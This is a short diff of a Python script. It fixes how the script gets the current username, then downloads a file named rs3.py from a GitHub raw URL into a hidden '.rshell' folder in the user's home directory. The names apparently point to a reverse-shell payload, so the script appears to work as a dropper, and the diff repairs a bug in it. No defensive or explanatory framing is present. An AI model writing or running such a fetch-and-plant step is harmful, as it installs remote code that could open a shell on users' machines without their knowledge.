@@ -1,9 +1,11 @@
 import shutil
 import os
+import getpass
 from stat import *
 
 import urllib.request
-USERNAME = os.system("whoami")
+USERNAME = getpass.getuser()
+
 RS3 = "https://raw.githubusercontent.com/TarunChakitha/testtest/master/rs3.py"
 
 urllib.request.urlretrieve(RS3, f"/home/{USERNAME}/.rshell/rs3.py")
